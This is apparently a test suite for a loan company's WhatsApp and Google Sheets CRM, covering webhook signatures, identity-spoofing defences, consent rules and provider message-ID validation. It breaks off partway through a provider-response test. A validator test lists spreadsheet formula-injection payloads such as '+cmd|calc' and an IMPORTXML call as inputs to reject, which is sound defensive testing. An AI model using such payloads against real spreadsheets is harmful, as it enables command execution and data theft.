/**
 * TASK 5H.33 — COMPLETE REMEDIATION, INTEGRATION CORRECTION & REGRESSION SUITE
 *
 * Covers Layers A–D against REAL transpiled production TypeScript modules and
 * unmodified `src/lib/google-sheets/gateway.gs` executed inside Node `vm`:
 *   - Group A: Unit tests (shared contracts, provider normalization, Meta/provider ID validator, backoff, consent)
 *   - Group B: D-01 Customer & Lead identity spoofing and ownership verification (all 9 negative/positive cases)
 *   - Group C: D-02 Meta, AiSensy, OmniDM & ChatMitra provider response validation (all 13 scenarios)
 *   - Group D: D-03 & R-07/H-01 Worker event/persistence contract and provider-scoped identity hardening
 *   - Group E: Section 9 Durable customer identity retry & reconciliation (zero schema changes, PII-free)
 *   - Group F: Section 12 Meta E2E & Section 13 ChatMitra E2E local source contracts
 *   - Group G: Section 11 Real `gateway.gs` VM end-to-end contract, formula injection & Layer D failure injection
 *
 * STRICT SAFETY: 100% offline, synthetic data only, zero live network calls,
 * zero real customer messages, poisoned MongoDB & PostgreSQL require hooks.
 */

const { describe, it, beforeEach, afterEach } = require('node:test');
const assert = require('node:assert/strict');
const crypto = require('node:crypto');
const fs = require('node:fs');
const Module = require('node:module');
const path = require('node:path');
const vm = require('node:vm');
const ts = require('typescript');

const ROOT_DIR = path.resolve(__dirname, '..');
const SRC_DIR = path.join(ROOT_DIR, 'src');

// ============================================================================
// 1. IN-MEMORY TYPESCRIPT TRANSPILER, @/ ALIAS & POISONED DB HOOKS
// ============================================================================
const origResolveFilename = Module._resolveFilename;
Module._resolveFilename = function (request, parent, isMain, options) {
  if (request.startsWith('@/')) {
    const rel = request.slice(2);
    const candidateBase = path.join(SRC_DIR, rel);
    const candidates = [
      candidateBase,
      `${candidateBase}.ts`,
      `${candidateBase}.tsx`,
      path.join(candidateBase, 'index.ts'),
      path.join(candidateBase, 'index.tsx')
    ];
    for (const c of candidates) {
      if (fs.existsSync(c) && fs.statSync(c).isFile()) return c;
    }
  }
  return origResolveFilename.call(this, request, parent, isMain, options);
};

require.extensions['.ts'] = function (mod, filename) {
  const source = fs.readFileSync(filename, 'utf8');
  const compiled = ts.transpileModule(source, {
    compilerOptions: {
      module: ts.ModuleKind.CommonJS,
      target: ts.ScriptTarget.ES2022,
      esModuleInterop: true,
      allowJs: true
    },
    fileName: filename
  });
  mod._compile(compiled.outputText, filename);
};

const nextServerMock = {
  NextResponse: class MockNextResponse {
    constructor(body, init = {}) {
      this._body = body;
      this.status = init.status || 200;
      this.headers = new Map(Object.entries(init.headers || {}));
    }
    async json() {
      return typeof this._body === 'string' ? JSON.parse(this._body) : this._body;
    }
    async text() {
      return typeof this._body === 'string' ? this._body : JSON.stringify(this._body);
    }
    static json(data, init = {}) {
      return new MockNextResponse(data, init);
    }
  }
};

let waitUntilPromises = [];
let mongoAttemptCount = 0;
let postgresAttemptCount = 0;

const originalLoad = Module._load;
Module._load = function (request, parent, isMain) {
  if (request === 'next/server') return nextServerMock;
  if (request === '@vercel/functions') {
    return {
      waitUntil: (promise) => {
        const tracked = Promise.resolve(promise).catch(() => {});
        waitUntilPromises.push(tracked);
        return tracked;
      }
    };
  }
  if (
    request === 'mongoose' ||
    request === '@/lib/db' ||
    request.endsWith('/lib/db') ||
    request === '@/models/Message' ||
    request === '@/models/ProviderLedger'
  ) {
    mongoAttemptCount++;
    throw new Error(`POISONED_MONGODB_LOAD: ${request}`);
  }
  if (request === 'pg' || request === '@/lib/postgres' || request.endsWith('/postgres')) {
    postgresAttemptCount++;
    throw new Error(`POISONED_POSTGRES_LOAD: ${request}`);
  }
  return originalLoad.call(this, request, parent, isMain);
};

// Load REAL production modules
const axios = require('axios');
const contract = require('../src/lib/messaging-contract.ts');
const sheets = require('../src/lib/google-sheets/index.ts');
const {
  CrmSheetsService,
  SHEET_COLUMNS,
  SheetsCrmError,
  UNRESOLVED_CUSTOMER_PREFIX,
  buildCanonicalMessageEventId,
  buildReconciliationConfigKey,
  buildScopedUnresolvedCustomerId,
  computePhoneLookupHash,
  computeReconciliationBackoffMs,
  configureMockSheetsFaults,
  consentRepository,
  customerRepository,
  evaluateCustomerConsentEligibility,
  followupRepository,
  getReconciliationDiagnostics,
  isUnresolvedCustomerId,
  leadRepository,
  messageEventRepository,
  normalizeMessageProviderKey,
  reconcilePendingMessageIdentities,
  resetMockSheetsStore,
  resetNoncesForTesting,
  signAppsScriptGatewayRequest,
  stagePendingIdentityReconciliation,
  systemConfigRepository,
  verifyCustomerAndLeadOwnership,
  webhookEventRepository
} = sheets;

const aisensy = require('../src/lib/aisensy.ts');
const chatmitra = require('../src/lib/chatmitra.ts');
const aiAgentMod = require('../src/lib/ai-agent.ts');
const metaWebhookRoute = require('../src/app/api/whatsapp-webhook/route.ts');
const chatmitraWebhookRoute = require('../src/app/api/chatmitra-webhook/route.ts');
const workerRoute = require('../src/app/api/whatsapp-webhook-worker/route.ts');

const AUTH_PHONE_E164 = '+919175635165';
const AUTH_PHONE_DIGITS = '919175635165';
const TEST_META_SECRET = 'task5h33_meta_app_secret_0123456789abcdef';
const TEST_CM_SECRET = 'task5h33_chatmitra_secret_0123456789abcdef';
const TEST_WORKER_SECRET = 'task5h33_worker_secret_0123456789abcdef';
const TEST_GATEWAY_SECRET = 'task5h33_gateway_hmac_secret_0123456789abcdef';
const TEST_SPREADSHEET_ID = '1AvaniTask5H33SyntheticSheet001';

const ENV_KEYS = [
  'GOOGLE_SHEETS_TRANSPORT_MODE',
  'GOOGLE_SHEETS_ENABLE_MOCK',
  'GOOGLE_SHEETS_GATEWAY_URL',
  'GOOGLE_SHEETS_GATEWAY_SECRET',
  'GOOGLE_SHEETS_SPREADSHEET_ID',
  'PROVIDER_MODE',
  'AUTHORIZED_TEST_PHONE_CANONICAL',
  'WHATSAPP_TOKEN',
  'WHATSAPP_PHONE_NUMBER_ID',
  'AISENCY_WABA_API_KEY',
  'AISENSY_WABA_API_KEY',
  'AISENSY_API_KEY',
  'OMNIDIM_API_KEY',
  'CHATMITRA_API_KEY',
  'CHATMITRA_WEBHOOK_SECRET',
  'META_APP_SECRET',
  'INTERNAL_WORKER_SECRET',
  'ACTIVE_WHATSAPP_PROVIDER',
  'WHATSAPP_INBOUND_AI_REPLY_ENABLED',
  'AISENSY_INBOUND_WEBHOOK_ENABLED',
  'BULK_BROADCAST_ENABLED',
  'AUTO_REPLY_ENABLED',
  'CHATMITRA_AUTO_REPLY_ENABLED',
  'CHATMITRA_INBOUND_AUTO_REPLY_ENABLED',
  'SAFE_MODE_FORCE_SUPPRESS',
  'WHATSAPP_WORKER_HANDOFF_TIMEOUT_MS',
  'GEMINI_API_KEY'
];

function snapshotEnv() {
  const snap = {};
  for (const k of ENV_KEYS) snap[k] = process.env[k];
  return snap;
}

function restoreEnv(snap) {
  for (const k of ENV_KEYS) {
    if (snap[k] === undefined) delete process.env[k];
    else process.env[k] = snap[k];
  }
}

function setupDefaultTestEnv() {
  resetMockSheetsStore();
  resetNoncesForTesting();
  waitUntilPromises = [];
  mongoAttemptCount = 0;
  postgresAttemptCount = 0;

  process.env.GOOGLE_SHEETS_TRANSPORT_MODE = 'MOCK_IN_MEMORY';
  process.env.GOOGLE_SHEETS_ENABLE_MOCK = 'true';
  process.env.PROVIDER_MODE = 'live';
  process.env.AUTHORIZED_TEST_PHONE_CANONICAL = AUTH_PHONE_E164;
  process.env.WHATSAPP_TOKEN = 'EAAG_TASK5H33_TEST_META_TOKEN';
  process.env.WHATSAPP_PHONE_NUMBER_ID = '1147494668457940';
  process.env.META_APP_SECRET = TEST_META_SECRET;
  process.env.CHATMITRA_WEBHOOK_SECRET = TEST_CM_SECRET;
  process.env.CHATMITRA_API_KEY = 'CM_TASK5H33_TEST_API_KEY';
  process.env.INTERNAL_WORKER_SECRET = TEST_WORKER_SECRET;
  process.env.WHATSAPP_INBOUND_AI_REPLY_ENABLED = 'true';
  process.env.AISENSY_INBOUND_WEBHOOK_ENABLED = 'true';
  process.env.AUTO_REPLY_ENABLED = 'true';
  process.env.CHATMITRA_AUTO_REPLY_ENABLED = 'true';
  process.env.CHATMITRA_INBOUND_AUTO_REPLY_ENABLED = 'true';
  process.env.SAFE_MODE_FORCE_SUPPRESS = 'false';
  delete process.env.AISENCY_WABA_API_KEY;
  delete process.env.AISENSY_WABA_API_KEY;
  delete process.env.AISENSY_API_KEY;
  delete process.env.OMNIDIM_API_KEY;
  delete process.env.ACTIVE_WHATSAPP_PROVIDER;
  delete process.env.GEMINI_API_KEY;
}

function signHmac(rawBody, secret, prefix = 'sha256=') {
  const hex = crypto.createHmac('sha256', secret).update(rawBody, 'utf8').digest('hex');
  return prefix ? `${prefix}${hex}` : hex;
}

function makeWorkerRequest(bodyObj, secret = TEST_WORKER_SECRET) {
  return new Request('https://www.avanifinserv.com/api/whatsapp-webhook-worker', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      ...(secret ? { 'x-worker-auth': secret } : {})
    },
    body: JSON.stringify(bodyObj)
  });
}

function makeMetaRequest(bodyObj, opts = {}) {
  const raw = typeof bodyObj === 'string' ? bodyObj : JSON.stringify(bodyObj);
  const headers = { 'Content-Type': 'application/json', 'user-agent': 'Meta-Webhooks/1.0' };
  if (opts.includeSig !== false) {
    headers['x-hub-signature-256'] = opts.sigOverride ?? signHmac(raw, TEST_META_SECRET, 'sha256=');
  }
  if (opts.correlationId) headers['x-correlation-id'] = opts.correlationId;
  return new Request('https://www.avanifinserv.com/api/whatsapp-webhook', {
    method: 'POST',
    headers,
    body: raw
  });
}

function makeChatMitraRequest(bodyObj, opts = {}) {
  const raw = typeof bodyObj === 'string' ? bodyObj : JSON.stringify(bodyObj);
  const headers = { 'Content-Type': 'application/json' };
  if (opts.includeSig !== false) {
    const headerName = opts.headerName || 'x-webhook-signature';
    const prefix = opts.prefix ?? '';
    headers[headerName] = opts.sigOverride ?? signHmac(raw, TEST_CM_SECRET, prefix);
  }
  if (opts.correlationId) headers['x-correlation-id'] = opts.correlationId;
  return new Request('https://www.avanifinserv.com/api/chatmitra-webhook', {
    method: 'POST',
    headers,
    body: raw
  });
}

async function seedCustomer(overrides = {}) {
  const { record } = await customerRepository.upsertCustomer({
    customer_id: overrides.customer_id || 'CUST-9175635165',
    customer_name: overrides.customer_name || 'Sachin Verified',
    mobile_number: overrides.mobile_number || AUTH_PHONE_E164,
    city: overrides.city || 'Latur',
    enquiry_source: overrides.enquiry_source || 'WEBSITE',
    record_status: overrides.record_status || 'ACTIVE'
  });
  return record;
}

// ============================================================================
// 2. REAL `src/lib/google-sheets/gateway.gs` NODE VM HARNESS (UNMODIFIED SOURCE)
// ============================================================================
function createGatewayVmHarness(opts = {}) {
  const gatewaySource = fs.readFileSync(
    path.join(SRC_DIR, 'lib/google-sheets/gateway.gs'),
    'utf8'
  );
  const sheetsMap = new Map();
  for (const [tabName, cols] of Object.entries(SHEET_COLUMNS)) {
    sheetsMap.set(tabName, [[...cols]]);
  }
  const cacheMap = new Map();
  const scriptProps = {
    GATEWAY_HMAC_SECRET: opts.secret ?? TEST_GATEWAY_SECRET,
    ALLOWED_SPREADSHEET_ID: opts.allowedSpreadsheetId ?? TEST_SPREADSHEET_ID
  };
  let lockHeld = false;
  let vmCallCount = 0;

  function makeSheetApi(tabName) {
    return {
      getName: () => tabName,
      getLastRow: () => sheetsMap.get(tabName).length,
      getLastColumn: () => (sheetsMap.get(tabName)[0] || []).length,
      getRange: (row, col, numRows, numCols) => ({
        getValues: () => {
          const data = sheetsMap.get(tabName);
          const out = [];
          for (let r = row - 1; r < row - 1 + numRows; r++) {
            const line = data[r] || [];
            out.push(line.slice(col - 1, col - 1 + numCols));
          }
          return out;
        },
        setValues: (vals) => {
          const data = sheetsMap.get(tabName);
          for (let r = 0; r < vals.length; r++) {
            const targetIdx = row - 1 + r;
            if (!data[targetIdx]) data[targetIdx] = [];
            for (let c = 0; c < vals[r].length; c++) {
              data[targetIdx][col - 1 + c] = vals[r][c];
            }
          }
        }
      }),
      appendRow: (rowArr) => {
        sheetsMap.get(tabName).push([...rowArr]);
      },
      deleteRow: (rowIdx1Based) => {
        sheetsMap.get(tabName).splice(rowIdx1Based - 1, 1);
      }
    };
  }

  const sandbox = {
    SpreadsheetApp: {
      getActiveSpreadsheet: () => ({
        getId: () => opts.activeSpreadsheetId ?? TEST_SPREADSHEET_ID,
        getName: () => 'AVANI_CRM_TASK5H33_VM',
        getSheetByName: (name) => (sheetsMap.has(name) ? makeSheetApi(name) : null)
      })
    },
    PropertiesService: {
      getScriptProperties: () => ({
        getProperty: (k) => (Object.prototype.hasOwnProperty.call(scriptProps, k) ? scriptProps[k] : null)
      })
    },
    CacheService: {
      getScriptCache: () => ({
        get: (k) => (cacheMap.has(k) ? cacheMap.get(k) : null),
        put: (k, v) => cacheMap.set(k, String(v))
      })
    },
    LockService: {
      getScriptLock: () => ({
        waitLock: () => { lockHeld = true; },
        hasLock: () => lockHeld,
        releaseLock: () => { lockHeld = false; }
      })
    },
    Utilities: {
      Charset: { UTF_8: 'utf8' },
      computeHmacSha256Signature: (text, secret) => {
        const buf = crypto.createHmac('sha256', secret).update(text, 'utf8').digest();
        return Array.from(buf).map((b) => (b > 127 ? b - 256 : b));
      }
    },
    ContentService: {
      MimeType: { JSON: 'application/json' },
      createTextOutput: (str) => ({
        _text: str,
        setMimeType() { return this; },
        getContent() { return this._text; }
      })
    },
    Date,
    JSON,
    Math,
    String,
    Number,
    Array,
    Object,
    RegExp,
    isFinite
  };

  vm.createContext(sandbox);
  vm.runInContext(gatewaySource, sandbox);

  async function gatewayFetch(_url, init) {
    vmCallCount++;
    const rawBody = typeof init?.body === 'string' ? init.body : '';
    const out = sandbox.doPost({ postData: { contents: rawBody } });
    const parsed = JSON.parse(out.getContent());
    return {
      ok: true,
      status: 200,
      json: async () => parsed
    };
  }

  return {
    sheetsMap,
    cacheMap,
    scriptProps,
    gatewayFetch,
    getVmCallCount: () => vmCallCount
  };
}

// ============================================================================
// GROUP A — LAYER A UNIT TESTS (SHARED CONTRACTS, NORMALIZATION, VALIDATORS)
// ============================================================================
describe('Group A — Layer A Unit Tests (Shared Contracts & State Machines)', () => {
  let envSnap;
  beforeEach(() => { envSnap = snapshotEnv(); setupDefaultTestEnv(); });
  afterEach(() => restoreEnv(envSnap));

  it('A01: normalizeSupportedProvider normalizes ONLY supported aliases and rejects missing/empty/unknown providers', () => {
    assert.equal(contract.normalizeSupportedProvider('Meta').key, 'META');
    assert.equal(contract.normalizeSupportedProvider('meta_cloud').canonicalName, 'Meta');
    assert.equal(contract.normalizeSupportedProvider('whatsapp').key, 'META');
    assert.equal(contract.normalizeSupportedProvider('ChatMitra').key, 'CHATMITRA');
    assert.equal(contract.normalizeSupportedProvider('ChatMantra').canonicalName, 'ChatMitra');
    assert.equal(contract.normalizeSupportedProvider('ChatMitra_Live').key, 'CHATMITRA');
    assert.equal(contract.normalizeSupportedProvider('AiSensy').key, 'AISENSY');
    assert.equal(contract.normalizeSupportedProvider('OmniDM').key, 'OMNIDM');
    assert.equal(contract.normalizeSupportedProvider('MockProvider').key, 'MOCK');

    for (const bad of [undefined, null, '', '   ', 'Twilio', 'Telegram', 'UnknownVendor', '===']) {
      assert.throws(
        () => contract.normalizeSupportedProvider(bad),
        (err) => err instanceof SheetsCrmError && err.code === 'GOOGLE_SHEETS_VALIDATION_FAILED',
        `Expected rejection for provider: ${String(bad)}`
      );
    }
  });

  it('A02: validateProviderMessageId accepts real provider IDs and rejects empty/malformed/formula/fabricated timestamp IDs', () => {
    assert.equal(contract.validateProviderMessageId('wamid.HBgMOTE5MTc1NjM1MTY1FQIAERgSNjM=', 'Meta').valid, true);
    assert.equal(contract.validateProviderMessageId('cm_live_9876543210_abc', 'ChatMitra').valid, true);

    const invalidCases = [
      [undefined, 'MISSING_OR_NON_STRING'],
      [null, 'MISSING_OR_NON_STRING'],
      [123456, 'MISSING_OR_NON_STRING'],
      ['', 'EMPTY_ID'],
      ['   ', 'EMPTY_ID'],
      ['=IMPORTXML("x","y")', 'FORMULA_PREFIX_BLOCKED'],
      ['+cmd|calc', 'FORMULA_PREFIX_BLOCKED'],
      ['@SUM(A1)', 'FORMULA_PREFIX_BLOCKED'],
      ['ab', 'INVALID_LENGTH'],
      ['null', 'SENTINEL_PLACEHOLDER'],
      ['undefined', 'SENTINEL_PLACEHOLDER'],
      ['unknown', 'SENTINEL_PLACEHOLDER'],
      ['meta_1795216644632', 'FABRICATED_TIMESTAMP_ID'],
      ['aisensy_1795216644632', 'FABRICATED_TIMESTAMP_ID'],
      ['omnidim_wa_1795216644632', 'FABRICATED_TIMESTAMP_ID'],
      ['CM-1795216644632', 'FABRICATED_TIMESTAMP_ID'],
      ['wamid with spaces', 'INVALID_FORMAT']
    ];
    for (const [val, expectedReason] of invalidCases) {
      const r = contract.validateProviderMessageId(val, 'Meta');
      assert.equal(r.valid, false, `Expected invalid for ${String(val)}`);
      assert.equal(r.reason, expectedReason, `Expected reason ${expectedReason} for ${String(val)}`);
    }
  });

  it('A03: isSupportedWorkerEventType allows ONLY INBOUND_MESSAGE and STATUS_UPDATE', () => {
    assert.equal(contract.isSupportedWorkerEventType('INBOUND_MESSAGE'), true);
    assert.equal(contract.isSupportedWorkerEventType('STATUS_UPDATE'), true);
    for (const bad of ['DIRECT_DISPATCH', 'NO_OP', 'UNKNOWN_EVT', '', null, undefined, 42]) {
      assert.equal(contract.isSupportedWorkerEventType(bad), false);
    }
  });

  it('A04: Backoff state machine is bounded with jitter and phone lookup hash exposes zero raw phone digits', () => {
    const d1 = computeReconciliationBackoffMs(1, { baseDelayMs: 1000, maxDelayMs: 10000, jitterRatio: 0.2, randomFn: () => 0.5 });
    const d2 = computeReconciliationBackoffMs(2, { baseDelayMs: 1000, maxDelayMs: 10000, jitterRatio: 0.2, randomFn: () => 0.5 });
    const d10 = computeReconciliationBackoffMs(10, { baseDelayMs: 1000, maxDelayMs: 10000, jitterRatio: 0.2, randomFn: () => 1.0 });
    assert.equal(d1, 1100);
    assert.equal(d2, 2200);
    assert.equal(d10, 10000, 'Backoff MUST never exceed maxDelayMs');

    const h1 = computePhoneLookupHash('+919175635165');
    const h2 = computePhoneLookupHash('9175635165');
    assert.equal(h1, h2, 'Phone lookup hash must be deterministic across phone formats');
    assert.equal(h1.length, 16);
    assert.equal(h1.includes('9175635165'), false);
    assert.equal(h1.includes('5165'), false);
  });

  it('A05: evaluateCustomerConsentEligibility requires explicit GRANTED and blocks PENDING/DENIED/WITHDRAWN/OPTED_OUT', async () => {
    const cust = await seedCustomer({ customer_id: 'CUST-CONSENT-1', mobile_number: '+919822111001' });

    // Missing consent record -> NOT eligible
    const noConsent = await evaluateCustomerConsentEligibility(cust);
    assert.equal(noConsent.eligibleForAiReply, false);
    assert.equal(noConsent.reason, 'CONSENT_NOT_GRANTED');

    // PENDING -> NOT eligible
    await consentRepository.upsertConsent({
      customer_id: cust.customer_id,
      channel: 'WHATSAPP',
      consent_status: 'PENDING',
      consent_source: 'WEBSITE',
      optout_status: 'OPTED_IN'
    });
    assert.equal((await evaluateCustomerConsentEligibility(cust)).eligibleForAiReply, false);

    // GRANTED -> eligible
    await consentRepository.upsertConsent({
      customer_id: cust.customer_id,
      channel: 'WHATSAPP',
      consent_status: 'GRANTED',
      consent_source: 'WEBSITE',
      optout_status: 'OPTED_IN'
    });
    assert.equal((await evaluateCustomerConsentEligibility(cust)).eligibleForAiReply, true);

    // WITHDRAWN -> opted out & blocked
    await consentRepository.upsertConsent({
      customer_id: cust.customer_id,
      channel: 'WHATSAPP',
      consent_status: 'WITHDRAWN',
      consent_source: 'WHATSAPP_OPTOUT',
      optout_status: 'OPTED_OUT'
    });
    const withdrawn = await evaluateCustomerConsentEligibility(cust);
    assert.equal(withdrawn.eligibleForAiReply, false);
    assert.equal(withdrawn.isOptedOut, true);
  });
});

// ============================================================================
// GROUP B — D-01 CUSTOMER & LEAD IDENTITY SPOOFING REMEDIATION
// ============================================================================
describe('Group B — D-01 Customer & Lead Identity Spoofing & Ownership Verification', () => {
  const origFetch = globalThis.fetch;
  const origAxiosPost = axios.post;
  let envSnap;

  beforeEach(() => {
    envSnap = snapshotEnv();
    setupDefaultTestEnv();
    process.env.WHATSAPP_INBOUND_AI_REPLY_ENABLED = 'false';
  });

  afterEach(() => {
    globalThis.fetch = origFetch;
    axios.post = origAxiosPost;
    restoreEnv(envSnap);
  });

  it('B01: Spoofed caller-supplied customerId and victim leadId are stripped by whatsapp-webhook and cannot reassign victim lead', async () => {
    await seedCustomer({ customer_id: 'CUST-VICTIM-01', customer_name: 'Victim', mobile_number: '+919822000111' });
    await leadRepository.upsertLead({
      lead_id: 'AVL-VICTIM-01',
      customer_id: 'CUST-VICTIM-01',
      loan_category: 'Home Loan',
      requested_amount: '7500000',
      assigned_advisor_id: 'ADV-SENIOR-02'
    });

    const forwardedPayloads = [];
    globalThis.fetch = async (url, init) => {
      forwardedPayloads.push(JSON.parse(init.body));
      const wResp = await workerRoute.POST(new Request(url, { method: init.method, headers: init.headers, body: init.body }));
      return { ok: wResp.status >= 200 && wResp.status < 300, status: wResp.status, json: () => wResp.json() };
    };

    const attackBody = {
      object: 'whatsapp_business_account',
      customerId: 'CUST-SPOOF-999',
      leadId: 'AVL-VICTIM-01',
      entry: [{
        changes: [{
          value: {
            messages: [{
              from: AUTH_PHONE_DIGITS,
              id: 'wamid.d01_attack_01',
              type: 'text',
              text: { body: 'I want a Personal Loan' },
              customerId: 'CUST-SPOOF-999',
              leadId: 'AVL-VICTIM-01'
            }]
          }
        }]
      }]
    };

    const resp = await metaWebhookRoute.POST(makeMetaRequest(attackBody));
    assert.equal(resp.status, 200);
    assert.equal(forwardedPayloads.length, 1);
    assert.equal(forwardedPayloads[0].data.customerId, undefined, 'Spoofed customerId must NEVER be forwarded');
    assert.equal(forwardedPayloads[0].data.leadId, undefined, 'Victim leadId must NEVER be forwarded');

    const victimLeadAfter = await leadRepository.findById('AVL-VICTIM-01');
    assert.equal(victimLeadAfter.customer_id, 'CUST-VICTIM-01', 'Victim lead owner must remain CUST-VICTIM-01');
    assert.equal(victimLeadAfter.assigned_advisor_id, 'ADV-SENIOR-02', 'Victim advisor must remain untouched');
  });

  it('B02: Direct repository leadRepository.upsertLead and CrmSheetsService reject cross-customer lead reassignment fail-closed', async () => {
    await seedCustomer({ customer_id: 'CUST-OWNER-A', mobile_number: '+919822000221' });
    await seedCustomer({ customer_id: 'CUST-OTHER-B', mobile_number: '+919822000222' });
    await leadRepository.upsertLead({
      lead_id: 'AVL-OWNER-A-1',
      customer_id: 'CUST-OWNER-A',
      loan_category: 'Doctor Loan',
      requested_amount: '1500000'
    });

    await assert.rejects(
      () =>
        leadRepository.upsertLead({
          lead_id: 'AVL-OWNER-A-1',
          customer_id: 'CUST-OTHER-B',
          loan_category: 'Personal Loan'
        }),
      (err) => err instanceof SheetsCrmError && err.code === 'GOOGLE_SHEETS_VALIDATION_FAILED'
    );

    await assert.rejects(
      () =>
        CrmSheetsService.registerOrUpdateCustomerLead({
          leadId: 'AVL-OWNER-A-1',
          name: 'Attacker B',
          phone: '+919822000222',
          loanCategory: 'Personal Loan'
        }),
      (err) => err instanceof SheetsCrmError && err.code === 'GOOGLE_SHEETS_VALIDATION_FAILED'
    );

    const leadAfter = await leadRepository.findById('AVL-OWNER-A-1');
    assert.equal(leadAfter.customer_id, 'CUST-OWNER-A');
  });

  it('B03: verifyCustomerAndLeadOwnership handles all negative identity attacks (invalid lead, mismatched customer, nonexistent customer, mobile mismatch)', async () => {
    await seedCustomer({ customer_id: 'CUST-REAL-1', mobile_number: '+919175635165' });
    await seedCustomer({ customer_id: 'CUST-REAL-2', mobile_number: '+919822334455' });
    await leadRepository.upsertLead({
      lead_id: 'AVL-REAL-1',
      customer_id: 'CUST-REAL-1',
      loan_category: 'Business Loan'
    });
    await leadRepository.upsertLead({
      lead_id: 'AVL-REAL-2',
      customer_id: 'CUST-REAL-2',
      loan_category: 'Home Loan'
    });

    // Valid customerId + invalid leadId -> resolves customer's real lead, marks candidate lead rejected
    const r1 = await verifyCustomerAndLeadOwnership({
      fromPhone: '+919175635165',
      candidateCustomerId: 'CUST-REAL-1',
      candidateLeadId: 'AVL-DOES-NOT-EXIST'
    });
    assert.equal(r1.verified, true);
    assert.equal(r1.customerId, 'CUST-REAL-1');
    assert.equal(r1.leadId, 'AVL-REAL-1');
    assert.equal(r1.rejectedCandidateLeadId, true);

    // Valid leadId belonging to different customer -> rejected, resolves sender's own customer & lead
    const r2 = await verifyCustomerAndLeadOwnership({
      fromPhone: '+919175635165',
      candidateCustomerId: 'CUST-REAL-1',
      candidateLeadId: 'AVL-REAL-2'
    });
    assert.equal(r2.verified, true);
    assert.equal(r2.customerId, 'CUST-REAL-1');
    assert.equal(r2.leadId, 'AVL-REAL-1');
    assert.equal(r2.rejectedCandidateLeadId, true);
    assert.equal(r2.rejectionReason, 'LEAD_OWNERSHIP_MISMATCH');

    // Customer ID that does not exist in CUSTOMERS (and unregistered phone) -> fails closed, zero invented ID
    const r3 = await verifyCustomerAndLeadOwnership({
      fromPhone: '+919700000999',
      candidateCustomerId: 'CUST-NONEXISTENT-404'
    });
    assert.equal(r3.verified, false);
    assert.equal(r3.customerId, undefined);
    assert.equal(r3.rejectedCandidateCustomerId, true);
    assert.equal(r3.rejectionReason, 'CUSTOMER_ID_NOT_FOUND');

    // Customer mobile mismatch (CUST-REAL-2 passed with CUST-REAL-1 phone, or unregistered phone) -> rejected
    const r4 = await verifyCustomerAndLeadOwnership({
      fromPhone: '+919700000999',
      candidateCustomerId: 'CUST-REAL-2'
    });
    assert.equal(r4.verified, false);
    assert.equal(r4.rejectedCandidateCustomerId, true);
    assert.equal(r4.rejectionReason, 'CUSTOMER_MOBILE_MISMATCH');
  });

  it('B04: Valid existing customer + matching lead preserved without overwriting advisor assignment, verified name, or non-GRANTED consent', async () => {
    await seedCustomer({
      customer_id: 'CUST-9175635165',
      customer_name: 'Dr Sachin Shinde',
      mobile_number: AUTH_PHONE_E164
    });
    await consentRepository.upsertConsent({
      customer_id: 'CUST-9175635165',
      channel: 'WHATSAPP',
      consent_status: 'PENDING',
      consent_source: 'WEBSITE',
      optout_status: 'OPTED_IN'
    });
    await leadRepository.upsertLead({
      lead_id: 'AVL-MATCH-01',
      customer_id: 'CUST-9175635165',
      loan_category: 'Doctor Loan',
      assigned_advisor_id: 'ADV-CUSTOM-09'
    });

    const resp = await workerRoute.POST(
      makeWorkerRequest({
        eventId: 'META_INBOUND_preserve_01',
        eventType: 'INBOUND_MESSAGE',
        provider: 'Meta',
        correlationId: 'CORR-PRES-1',
        data: {
          fromPhone: AUTH_PHONE_E164,
          msgId: 'wamid.preserve_01',
          profileName: 'Customer',
          customerId: 'CUST-9175635165',
          leadId: 'AVL-MATCH-01',
          message: { type: 'text', text: { body: 'Checking loan status' }, id: 'wamid.preserve_01' }
        }
      })
    );
    assert.equal(resp.status, 200);
    const data = await resp.json();
    assert.equal(data.consentSuppressed, true);
    assert.equal(data.consentStatus, 'PENDING');

    const custAfter = await customerRepository.findById('CUST-9175635165');
    const leadAfter = await leadRepository.findById('AVL-MATCH-01');
    const consentAfter = await consentRepository.findByCustomerId('CUST-9175635165');
    assert.equal(custAfter.customer_name, 'Dr Sachin Shinde', 'Generic inbound profileName must not overwrite verified name');
    assert.equal(leadAfter.assigned_advisor_id, 'ADV-CUSTOM-09', 'Inbound message must not overwrite advisor assignment');
    assert.equal(consentAfter.consent_status, 'PENDING', 'Inbound message must not overwrite PENDING consent');
  });

  it('B05: New legitimate customer without existing lead creates canonical records cleanly and duplicate replay is idempotent', async () => {
    globalThis.fetch = async (url, init) => {
      const wResp = await workerRoute.POST(new Request(url, { method: init.method, headers: init.headers, body: init.body }));
      return { ok: wResp.status >= 200 && wResp.status < 300, status: wResp.status, json: () => wResp.json() };
    };

    const body = {
      object: 'whatsapp_business_account',
      entry: [{
        changes: [{
          value: {
            contacts: [{ profile: { name: 'New Applicant' } }],
            messages: [{ from: AUTH_PHONE_DIGITS, id: 'wamid.new_legit_01', type: 'text', text: { body: 'Need a Business Loan' } }]
          }
        }]
      }]
    };

    const r1 = await metaWebhookRoute.POST(makeMetaRequest(body));
    assert.equal(r1.status, 200);
    const d1 = await r1.json();
    assert.equal(d1.persisted, true);
    assert.equal(d1.persistenceState, 'PERSISTED');

    const r2 = await metaWebhookRoute.POST(makeMetaRequest(body));
    assert.equal(r2.status, 200);
    const d2 = await r2.json();
    assert.equal(d2.duplicate, true);
    assert.equal(d2.persistenceState, 'DUPLICATE_ALREADY_PERSISTED');
    assert.equal((await customerRepository.findAll()).length, 1);
    assert.equal((await leadRepository.findAll()).length, 1);
    assert.equal((await messageEventRepository.findAll()).length, 1);
  });
});

// ============================================================================
// GROUP C — D-02 REMOVE FABRICATED PROVIDER MESSAGE IDs
// ============================================================================
describe('Group C — D-02 Meta, AiSensy, OmniDM & ChatMitra Response Validation', () => {
  const origAxiosPost = axios.post;
  let envSnap;

  beforeEach(async () => {
    envSnap = snapshotEnv();
    setupDefaultTestEnv();
    await seedCustomer();
  });

  afterEach(() => {
    axios.post = origAxiosPost;
    restoreEnv(envSnap);
  });

  it('C01: Meta HTTP 200 with valid messages[0].id succeeds for both text and template messages and preserves actual wamid', async () => {
    axios.post = async (_url, body) => ({
      status: 200,
      data: { messages: [{ id: body.type === 'template' ? 'wamid.valid_tpl_01' : 'wamid.valid_txt_01' }] }
    });

    const txtRes = await aisensy.sendAiSensyWhatsApp(
      { destination: AUTH_PHONE_E164, userName: 'Sachin', text: 'Hello', customerId: 'CUST-9175635165' },
      'corr_txt'
    );
    assert.equal(txtRes.success, true);
    assert.equal(txtRes.persisted, true);
    assert.equal(txtRes.providerAccepted, true);
